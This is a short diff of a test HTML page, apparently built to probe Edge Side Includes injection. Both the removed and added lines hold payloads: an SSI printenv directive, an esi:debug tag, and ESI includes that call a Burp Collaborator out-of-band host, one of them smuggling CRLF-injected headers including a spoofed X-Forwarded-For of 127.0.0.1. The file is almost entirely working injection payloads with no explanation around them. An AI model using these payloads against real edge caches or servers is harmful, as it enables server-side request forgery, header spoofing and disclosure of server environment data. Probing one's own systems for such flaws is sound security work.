@@ -3,7 +3,7 @@
 <body>
 cocoh_23 page
 <esi:vars>$strftime($time(), '%A %B %d, %Y')</esi:vars>
-<esi:include src="sample.html"/>
-<!--#printenv -->
-<esi:include src="http://sc883vtowswoysnzvzgsy2ymndt5lta.oastify.com/"/>
+<esi:debug/>
+<esi:include src="/sample.html"/>
+<esi:include src="http://sc883vtowswoysnzvzgsy2ymndt5lta.oastify.com/%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunkHeader:%20JunkValue/"/>
 </body>
